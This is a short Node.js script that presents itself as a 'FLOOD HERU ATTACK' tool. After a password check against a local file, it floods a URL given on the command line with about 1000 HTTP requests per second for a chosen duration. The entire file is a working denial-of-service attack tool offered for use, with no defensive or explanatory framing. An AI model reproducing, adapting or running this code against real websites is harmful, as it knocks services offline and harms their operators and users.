const fs = require('fs');
const readline = require('readline');

const target = process.argv[2];
const duration = parseInt(process.argv[3]);

if (!target || isNaN(duration)) {
    console.error('╭═══════════════════════════════════════╮');
    console.error('Invalid Usage: node h.js url and duration');
    console.error('╰═══════════════════════════════════════╯');
    process.exit(1);
}

const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

rl.question('Enter the password: ', (password) => {
    fs.readFile('password.txt', 'utf8', (err, data) => {
        if (err) {
            console.error('Error reading password file:', err);
            process.exit(1);
        }

        const storedPassword = data.trim();

        if (password !== storedPassword) {
            console.error('╭═══════════════════════════════════════╮');
            console.error('Invalid Password');
            console.error('╰═══════════════════════════════════════╯');
            process.exit(1);
        }

        console.log(`╭═════════════════════════════════╮`);
        console.log(`       FLOOD HERU ATTACK INITIATED    `);
        console.log(`☣️ Target: ${target}              `);
        console.log(`🕣 Duration: ${duration}s         `);
        console.log(`╰═════════════════════════════════╯`);

        const attackInterval = setInterval(() => {
            for (let i = 0; i < 100; i++) {
                fetch(target)
                    .then(() => console.log(`Request sent to ${target}`))
                    .catch(() => console.error(`Failed to send request to ${target}`));
            }
        }, 100);

        setTimeout(() => {
            clearInterval(attackInterval);
            console.log('╭═════════════════════════════════╮');
            console.log('       FLOOD HERU ATTACK ENDED     ');
            console.log('╰═════════════════════════════════╯');
            process.exit(0);
        }, duration * 1000);

        rl.close();
    });
});